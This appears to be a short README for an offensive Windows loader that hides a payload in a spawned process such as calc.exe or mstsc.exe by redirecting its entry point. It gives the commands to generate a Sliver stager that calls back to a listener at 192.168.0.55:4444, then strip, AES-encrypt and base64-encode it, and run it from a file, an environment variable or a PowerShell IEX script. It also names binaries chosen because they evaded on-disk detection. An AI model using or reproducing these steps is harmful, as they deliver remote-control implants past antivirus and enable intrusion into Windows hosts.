This is all for research purposes only. Tested in an isolated lab environment.

AddressOfEntryPoint points to payload address within the created process (calc.exe by default; must change in source code and recompile).

Target windows binaries that didn't get flagged on disk:
------------------
C:\\Windows\\System32\\mstsc.exe
C:\\Windows\\System32\\calc.exe

Payload requirement:
-----
Payload must be stager from sliver. .Example:
```
generate stager --lhost 192.168.0.55 --lport 4444 --os windows -a amd64 -f csharp --save /path/hexfile.txt
```

Strip the output file so it looks like an array; no new line characters, no spaces:
```
cat hexfile.txt | tr -d ' ' | tr -d '\n' | sed -r 's/^.*\{//' | sed -r 's/\};$//'
```

Then the payload must be formated with AES_Encrypt_Byte_Buffer.exe. Outputs b64Output.txt.

I imagine there's some size restrictions here if using the env variable command below.

Usage:
---
Load from a file:
```
.\RunRCX.exe .\b64Output.txt 1
```

Load from variable:
```
.\RunRCX.exe $base64code 2
```

Also can run getpayload.ps1 with IEX.
